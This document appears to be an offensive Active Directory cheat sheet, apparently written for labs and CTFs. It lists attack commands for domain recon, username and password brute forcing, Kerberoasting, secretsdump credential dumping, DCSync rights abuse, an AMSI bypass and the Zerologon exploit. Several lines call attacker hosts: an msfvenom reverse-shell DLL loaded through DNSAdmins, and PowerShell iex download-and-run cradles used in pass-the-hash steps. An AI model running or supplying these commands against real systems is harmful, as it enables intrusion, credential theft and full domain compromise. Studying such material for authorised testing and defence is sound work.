# Active Directory
**High Level Steps**
1. Recon with no credentials
2. Gain low level credentials
3. Domain Enumeration
4. Local Privilege Escalation
5. Administrator Recon
6. Lateral Movement
7. Domain Administrator Privleges
8. Cross Trust Attacks
9. Persist and Exfiltrate

## No Credentials
### Initial Scans
| Info | Command  |
|:-----|:---------|
| Scan LDAP with nmap | `nmap -p 389 -sC -sV $ip` |
| LDAP Enumeration | `ldapsearch -v -x -b "DC=domain,DC=local" -H "ldap://$ip"` |
| Get User account & description field | `ldapsearch -v -x -b "DC=domain,DC=local" -H "ldap://$ip" \| grep 'sAMAccountName\|description'` |
| Get User accounts | `rpcclient -U% $ip; enumdomusers; enumdomains; enumprivs` |
| Quick Bruteforce scan for valid usernames | `kerbrute userenum -d $domain --dc $ip /usr/share/seclists/Usernames/Names/names.txt` |
| Extensive Bruteforce scan for valid usernames | `kerbrute userenum -d $domain --dc $ip /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` |
| Extensive Bruteforce scan for valid usernames | `kerbrute -users /usr/share/wordlists/names.txt -domain DICTIONARY -dc-ip $ip` |
| Userless RDP session / See who is logged on / lock screen info | `rdesktop -f -u "" $ip` |
| Get Password Policy | `crackmapexec smb $ip --pass-pol -u '' -p ''` |
| Get Hashes if anon access allowed | `python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py $domain/ -format john -outputfile hash` |
| List and get TGTs for those users without preauth set | `python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py brute.csl/ -usersfile users.txt -format john -outputfile hash` |
| Crack Hashes | Use John to crack hashes | `john hash --wordlist=/usr/share/wordlists/rockyou.txt ` |
| Get users from IPC$ share | `python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@$ip \| tee users.txt` |

### Brute Force
| Info | Command |
|:-----|:--------|
| WinRM User list & Password list | `crackmapexec winrm -u users.txt -p wordlist.txt -d $domain $ip` |
| SMB User list & Password list | `crackmapexec smb -u users.txt -p passwords.txt -d $domain $ip` |
| Mash user first & last name list | `ctf-wordlist-names.sh users.txt` |
| Generate Usernames | `./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt` |

#### Password Generator
```python
months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
years = ['2013', '2014', '2015', '2016', '2017', '2018', '2019', '2020', '2021']

with open('wordlist.txt', 'w') as wordlist:
    for month in months:
        for year in years:
            password = month + year
            wordlist.write(f'{password}\n')
```

`python3 generator.py`

## Credentials
### Remote Login
| Info | Command |
|:-----|:--------|
| Psexec | `psexec.py $domain/$user@$ip` |
| Psexec with hash | `psexec.py domain.local/administrator@$ip -hashes d9485863c1e9e05851aa40cbb4ab9dff:d9485863c1e9e05851aa40cbb4ab9dff` |
| RDP  | `remmina -c rdp://username@$ip` |
| RPC | `rpcclient -U $user $ip; enumdomusers; QUERYDISPINFO` |
| SMB | `smbclient //$ip/$share -U "$user"` |
| SMB | `crackmapexec smb -u $user -p $password --shares $ip` |
| WinRM  | `evil-winrm -i $ip -u $user -p $password` |
| WinRM (Certificate) | `evil-winrm -i $ip -k priv.pem -c cert.crt -P 5986 -S` |

### User Scans
| Info | Command |
|:-----|:--------|
| Enumerate other users | `rpcclient -U $user $ip; enumdomusers` |
| Get User account with creds | `GetADUsers.py -all domain.local/$user -dc-ip $ip` |
| Get User accounts & descriptions with creds | `/opt/pywerview/pywerview.py get-netuser -w domain.local -u $user -p $password -t $ip \| grep 'samaccountname\|description'`
| Download sharphound | `echo "certutil.exe -urlcache -f http://$lhost/windows/privesc/SharpHound.exe sharphound.exe" \| cb` |
| From Userlist (Check if preauthentication is enabled (If not we can steal hashes)) | `GetNPUsers.py $domain/ -no-pass -usersfile users.txt -request` |
| Bloodhound Python | `bloodhound-python -d domain.local -u $user -p $password -gc dc.domain.local -c all -ns $ip`
| Kerberoast with Creds | `python2 /opt/impacket/examples/GetUserSPNs.py domain.local/$user -outputfile hash` |
| Dump Secrets | `/opt/impacket/examples/secretsdump.py domain.local/$user@$ip` |
| Dump Secrets | `secretsdump.py domain.local/$user@$ip -just-dc-user Administrator` |
| GetUserSPNs | `python3 /opt/impacket/examples/GetUserSPNs.py domain.local/$user:$password` |

### Domain Enumeration
#### .Net Classes

* Get Domain `$ADClass = [SystemDirectoryServices.ActiveDirectory.Domain];$ADClass::GetCurrentDomain()` |
* Get all objects

```PowerShell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Searcher.FindAll()
```

#### PowerView
| Info | Command |
|:-----|:--------|
| Download & Import PowerView | `iex(new-object net.webclient).downloadstring('http://$lhost/windows/privesc/PowerView.ps1');Import-Module .\PowerView.ps1` |
| Get Domain | `Get-NetDomain` | 
| Get object of another domain | `Get-NetDomain -Domain domain.local` |
| Get domain SID for the current domain | `Get-DomainSID` |
| Get domain policy for the current domain | `(Get-DomainPolicy)."System Access"` |
| Get kerberos policy for the current domain | `(Get-DomainPolicy)."Kerberos Access"` |
| Get domain policy for the another domain | `(Get-DomainPolicy -domain domain.local)."System Access"` |
| Get Domain controllers for the current domain | `Get-NetDomainController` |
| Get Domain controllers for another domain | `Get-NetDomainController -Domain domain.local` |
| Get a list of users in the current domain | `Get-NetUser` |
| Get list of properties for all users in the current domain | `Get-UserProperty` |
| Get User description | `Find-UserField -SearchField Description -SearchTerm "built"` |
| Get a list of computers in the current domain | `Get-NetComputer` |
| Get a list of computers in the current domain | `Get-NetComputer -OperatingSystem "*Server 2016*"` |
| Get a list of computers in the current domain | `Get-NetComputer -Ping` | 
| Get a list of computers in the current domain | `Get-NetComputer -FullData` |
| Get all the groups in the current domain | `Get-NetGroup` |
| Get all the groups in the current domain | `Get-NetGroup -Domain domain.local` |
| Get all the groups in the current domain | `Get-NetGroup -FullData` |
| Get all the groups in the current domain | `Get-NetGroup -FullData` |
| Get all the members of the Domain Admins group | `Get-NetGroupMember -GroupName "Domain Admins" -Recurse` |
| Get the group memberships for a user | `Get-NetGroup -UserName "user1"` |
| List all the local groups on a machine (needs admin on non-dc machines) | `Get-NetLocalGroup -ComputerName computer1.domain.local -ListGroups` |
| Get members of all the local groups on a machine (needs admin on non-dc machines) | `Get-NetLocalGroup -ComputerName computer1.domain.local -Recurse` |
| Get actively logged on users on computer (needs local admin) | `Get-NetLoggedOn -ComputerName computer1` |
| Get locally logged on users on a computer (needs remote registry) | `Get-LoggedonLocal -Computer computer1.domain.local` |
| Get the last logged on user on a computter (needs admin & remote registry) | `Get-LastLoggedOn -ComputerName computer1.domain.local` |
| Find shares on hosts siin current domain | `Invoke-ShareFinder -Verbose` |
| Find sensitive files on computers in the domain | `Invoke-FileFinder -Verbose` |
| Get all fileservers of the domain | `Get-NetFileServer` |
| Get list of GPO in current domain | `Get-NetGPO` |
| Get list of GPO in current domain | `Get-NetGPO -All` |
| Get list of GPO in current domain | `Get-GPO -All` |
| Get GPOs which use restricted groups of groups.xml for interesting users | `Get-NetGPOGroup` |
| Find users which are in a local group of a machine using GPO | `Find-GPOComputerAdmin -Computername computer1.domain.local` |
| Get machines where the given user is member of a specific group | `Find-GPOLocation -UserName user1 -Verbose` |
| Get OUs in a domain | `Get-NetOU -FullData` |
| Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU | `Get-NetGPO -GPOName "{AB306569-220D-43FF-B03B}"` |
| Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU | `Get-GPO -Guid AB306569-220D-43FF-B03B` |
| Get the ACLs associated with the specific object | `Get-ObjectACL -SamAccountName user1 -ResolveGUIDs` |
| Get the ACLs associated with the specific prefix to be used for search | `Get-ObjectAcl -ADSprefix 'CN=Administrators,CN=Users' -Verbose` |
| Get the ACLs associated with the specified LDAP path to be used for search | `Get-ObjectACL -ADSpath 'LDAP://CN=Domain AdminsCN=Users,DC=domain,DC=local' -ResolveGUIs -Verbose` |
| Search for interesting ACEs | `Invoke-ACLScanner -ResolveGUIDs` | 
| Get the ACLs associated with the specified path | `Get-PathAcl -Path '\\domain.local\sysvol'` |
| Get a list of all domain trusts for the current domain | `Get-NetDomainTrust` |
| Get a list of all domain trusts for the current domain | `Get-NetDomainTrust -Domain domain.local` |
| Get details about the current forest | `Get-NetForest` |
| Get details about the current forest | `Get-NetForest -Forest domain.local` |
| Get all domains in the current forest | `Get-NetForestDomain` |
| Get all domains in the current forest | `Get-NetForestDomain -Forest domain.local` |
| Get all global catalogs for the current forest | `Get-NetForestCatalog` |
| Get all global catalogs for the current forest | `Get-NetForestCatalog -Forest domain.local` |
| Map trusts of a forest | `Get-NetForestTrust` |
| Map trusts of a forest | `Get-NetForestTrust -Forest domain.local` |
| Find all machines on the current domain where the current user has local admin access | `Find-LocalAdminAccess` |
| Find local admins on all machines of tthe domain | `Invoke-EnumerateLocalAdmin -Verbose` |
| Find computers where a domain admin is logged in | `Invoke-UserHunter -Stealth` |

#### ActiveDirectory PowerShell Module
| Info | Command |
|:-----|:--------|
| Download & Import Microsoft Active Directory Module | `iex (new-Object Net.WebClient).DownloadString('http://$lhost/windows/privesc/Import-ActiveDirectory.ps1');Import-Module .\Microsoft.ActiveDirectory.Management.dll -Verbose` |
| Download & Import Microsoft Active Directory Module | `iex (new-Object Net.WebClient).DownloadString('http://$lhost/windows/privesc/ActiveDirectory.psd1');Import-Module .\ActiveDirectory.psd1` |
| Get Domain (ActiveDirectory Module) | `Get-ADDomain` |
| Get object of another domain (ActiveDirectory Module) | `Get-ADDomain -Identity domain.local` |
| Get domain SID for the current domain (ActiveDirectory Module) | `(Get-ADDomain).DomainSID` |
| Get domain policy for the current domain (ActiveDirectory Module) | `` |
| Get domain controllers for the current domain | `Get-ADDomainController` |
| Get domain controllers for another domain | `Get-ADDomainController - DomainName domain.local -Discover` |
| Get a list of users in the current domain | `Get-ADUser -Filter * -Properties *` |
| Get list of properties for all users in the current domain | `Get-ADUser -Filter * - Properties *` |
| Get User description | `Get-ADUser - Filter 'Description -like "*built*" -Properties Description | Select name,description` |
| Get a list of computers in the current domain | `Get-ADComputer -Filter * \| Select Name` |
| Get a list of computers in the current domain | `Get-ADComputer 'OperatingSystem -like "*Server 2016*" -Properties OperatingSystem \| Select Name,OperatingSystem` |
| Get a list of computers in the current domain | `Get-ADComputer -Filter * -Properties DNSHostName \| % {Test-Connection -Count 1 -ComputerName $_.DNSHostName}` | 
| Get a list of computers in the current domain | `Get-ADComputer -Filter * -Properties *` |
| Get all groups in the current domain | `Get-ADGroup -Filter * \| Select Name` |
| Get all groups in the current domain | `Get-ADGroup -Filter * -Properties *` |
| Get all groups in the current domain with admin in the name | `Get-ADGroup -Filter 'Name -like "*admin*"' \| select Name` |
| Get all the members of the Domain Admins group | `Get-ADGroupMember -Identity "Domain Admins" -Recursive` |
| Get the group memberships for a user | `Get-ADPrincipalGroupMembership -Identity user1` |
| Get resultant set of group policies | `GetGPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html` |
| Get OUs in a domain | `Get-ADOrganizationalUnit -Filter * -Properties *` |
| Enumerate ACLs | `(Get-Acl 'AD:\CN=Administrators,CN=Users,DC=domain,DC=local).Access` |
| Get a list of all domain trusts for the current domain | `Get-ADTrust` |
| Get a list of all domain trusts for the current domain | `Get-ADTrust -Identity domain.local` |
| Get details about the curren forest | `Get-ADForest` |
| Get details about the curren forest | `Get-ADForest -Identity domain.local` |
| Get all domains in the current forest | `(Get-ADForest).Domains` |
| Get all global catalogs for the current forest | `Get-ADForest \| select -ExpandProperty GlobalCatalogs` |
| Map trusts of a forest | `Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"` |

#### SharpHound
| Info | Command |
|:-----|:--------|
| Download sharphound | `echo "certutil.exe -urlcache -f http://$lhost/windows/privesc/SharpHound.exe sharphound.exe" \| cb` |
| Download sharphound (Evil-WinRM) | `upload /home/kali/share/windows/privesc/SharpHound.exe` |
| Start neo4j | `sudo neo4j console` |
| Run Bloodhound | `bloodhound` |

#### Remote Python Scan
```python
>>> import ldap3
>>> server = ldap3.Server('$ip', get_info = ldap3.ALL)
>>> connection = ldap3.Connection(server, user='Karen', password='MANAGER')
>>> connection.bind()
True
# Basic Server Info
>>> server.info
# All LDAP Entries
>>> connection.search(search_base='DC=toast,DC=csl', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
>>> connection.entries
```

### Privilege Escalation
* Search for local administrator access on other machines
* Search for high privilege accounts like Domain Administrator
* Search for local privilege escalation

### Group Policies
| Info | Command |
|:-----|:--------|
| SharpGPO upload (Evil-WinRM) | `upload /root/share/windows/privesc/SharpGPOAbuse.exe` |
| SharpGPO upload (Evil-WinRM) | `upload /root/share/windows/privesc/CommandLine.dll` |
| SharpGPO payload | `.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author SPRAY\administrator --Command "cmd.exe" --Arguments "/c whoami > C:\task.txt" --GPOName "DCPolicy"` |
| Update group policy | `gpupdate /force` |
| Clean up | `New-GPOImmediateTask -Remove -Force -GPODisplayName DCPolicy`

## Exploits
### Constrained Delegation
| Info | Command |
|:-----|:--------|
| Get info about the delegation | `findDelegation.py -debug COOCTUS.CORP/password-reset:resetpassword -dc-ip $ip` |
| Get info about the delegation | `python3 /opt/pywerview/pywerview.py get-netuser -u password-reset -p resetpassword -t $ip -d COOCTUS.CORP` |
| Impersonate and get ticket of the Administrator | `getST.py -spn oakley/DC.COOCTUS.CORP -impersonate administrator "COOCTUS.CORP/password-reset:resetpassword" -dc-ip $ip` |
| Export ticket to a variable | `export KRB5CCNAME=administrator.ccache` |
| Dump secrets | `secretsdump.py -k -no-pass DC.COOCTUS.CORP` |

### DNSAdmins
| Info | Command |
|:-----|:--------|
| Generate DLL file | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 -f dll -o rev.dll` |
| Start SMB share | `smbserver.py s .` |
| Load DLL | `dnscmd.exe /config /serverlevelplugindll \\10.10.14.11\s\rev.dll` |
| Stop and Start service | `sc stop dns && sc start dns` |

### Exchange Windows Permissions (WriteDacl on Domain)
| Info | Command |
|:-----|:--------|
| Add a new user | `net user john abc123! /add /domain`
| Add to the Exchange group | `net group "Exchange Windows Permissions" john /add`
| Add to the remote management group | `net localgroup "Remote Management Users" john /add` |
| Load evil-winrm menu | `menu` |
| Enable AMSI Bypass | `Bypass-4MSI` |
| Download PowerView | `iex(new-object net.webclient).downloadstring('http://10.10.16.4/windows/privesc/PowerView.ps1')` |
| Create password object | `$SecPassword = ConvertTo-SecureString 'abc123!' -AsPlainText -Force` |
| Create credentials object | `$Cred = New-Object System.Management.Automation.PSCredential('htb\john', $SecPassword)` |
| Give the user DCSync rights | `Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync` |
| Dump the administrator hashes | `secretsdump.py htb.local/john@$ip -just-dc-user Administrator` |

### GMSAPassword
| Info | Command |
|:-----|:--------|
| Upload GMSAPasswordReader Evil-WinRM | `upload /home/kali/share/windows/privesc/GMSAPasswordReader.exe` | 
| Run GMSAPasswordReader | `.\GMSAPasswordReader.exe --AccountName SVC_APACHE` | 
| Manual PowerShell method step #1 | `$gmsa = Get-ADServiceAccount -Identity 'SVC_APACHE' -Properties 'msDS-ManagedPassword'` |
| Manual PowerShell method step #2 | `$mp = $gmsa.'msDS-ManagedPassword'` |
| Manual PowerShell method step #3 | `$mp -join ','`
| Manual PowerShell method step #4 (On other box) | `(ConvertFrom-ADManagedPasswordBlob <blob>).SecureCurrentPassword | ConvertTo-NTHash`

### NTLM Theft
| Info | Command |
|:-----|:--------|
| Generate files | `python3 /opt/ntlm_theft/ntlm_theft.py --generate all --server 10.10.0.15 --file test234` |
| Start responder to capture hashes | `responder -I tun0` |

### Zero Login
| Info | Command |
|:-----|:--------|
| Run Exploit | `python3 cve-2020-1472-exploit.py -t $ip -n ZERO-DC` |
| Dump Secrets | `secretsdump.py -no-pass -just-dc zero/'Zero-DC$'@172.31.1.29` |
| Dump Secrest | `/opt/impacket/examples/secretsdump.py roast.csl/roastsvc@$ip` |

### Pass the Hash
#### Locally
| Info | Command |
|:-----|:--------|
| WMIExec 1 - Upload from Evil-WinRM | `upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-WMIExec.ps1` |
| WMIExec 2 - Import Module | `. ./Invoke-WMIExec.ps1` |
| WMIExec 3 - Run Command | `Invoke-WMIExec -Target dc01 -Domain heist.offsec -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4 -Command 'powershell -ep bypass -Command "iex(iwr http://192.168.49.111:80 -UseBasicParsing)"' -verbose`
| SMBExec 1 - Upload from Evil-WinRM | `upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-SMBExec.ps1` |
| SMBExec 2 - Import Module | `. ./Invoke-SMBExec.ps1` |
| SMBExec 3 - Run Command | `Invoke-SMBExec -Target dc01 -Domain heist.offsec -Username svc_apache$ -hash 78bc82c952449150a12ad60e870a2be4 -Command 'powershell -ep bypass -Command "iex(iwr http://192.168.49.111:80/pc.ps1 -UseBasicParsing)"' -verbose` |
| SMBEnum 1 - Upload from Evil-WinRM | `upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-SMBEnum.ps1` | 
| SMBEnum 2 - Import Module | `. ./Invoke-SMBEnum.ps1` | 
| SMBEnum 3 - Run Command | `Invoke-SMBEnum -Domain heist.offsec -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4 -Target dc01 -verbose` |
| SMBClient 1 - Upload from Evil-WinRM | `upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-SMBClient.ps1` | 
| SMBClient 2 - Import Module | `. ./Invoke-SMBClient.ps1` | 
| SMBClient 3 - Run Command | `Invoke-SMBClient -Domain heist.offsec -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4 -Action Recurse -Source \\dc01.heist.offsec\C$\ -verbose` |
| TheHash 1 - Upload from Evil-WinRM | `upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-TheHash.ps1` | 
| TheHash 2 - Import Module | `. ./Invoke-TheHash.ps1` | 
| TheHash 3 - Run Command | `Invoke-TheHash -Type WMIExec -Target dc01 -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4` |

#### Remotely
| Info | Command |
|:-----|:--------|
| crackmapexec | `crackmapexec smb $ip -u $user -H $hash` | 
| psexec | `psexec.py $user@$ip -hashes :$hash` |
| secretsdump | `secretsdump.py $user@$ip -hashes $hash` |
| smbclient | `smbclient //$ip/$share -U $user --pw-nt-hash $hash` |
| WinRM | `evil-winrm -i $ip -u $user -H $hash` |
| wmiexec.py | `wmiexec.py $user@$ip -hashes :$hash` |
| xfreerdp 1 - Disable Restricted admin if required (Need admin) | `cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'` |
| xfreerdp 2 | `xfreerdp /v:$ip /u:$user /pth:$hash` |
